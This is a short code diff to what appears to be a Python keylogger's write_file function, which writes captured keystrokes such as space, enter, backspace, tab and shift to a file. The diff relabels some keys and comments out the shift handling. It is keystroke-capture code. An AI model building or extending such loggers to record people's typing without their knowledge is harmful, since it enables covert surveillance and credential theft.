@@ -47,14 +47,17 @@ def write_file(keys):
             if key == Key.space:
                 f.write(" ")
 
+            elif key == Key.enter:
+                f.write("")
+
             elif key == Key.backspace:
-                f.write("[BACKSPACE]")
+                f.write("[DELETE]")
 
             elif key == Key.tab:
                 f.write("[TAB]")
 
-            elif key == Key.shift:
-                f.write("[SHIFT]")
+            # elif key == Key.shift:
+                # f.write("[SHIFT]")
 
             elif key == Key.shift_r:
                 f.write("[SHIFT_R]")
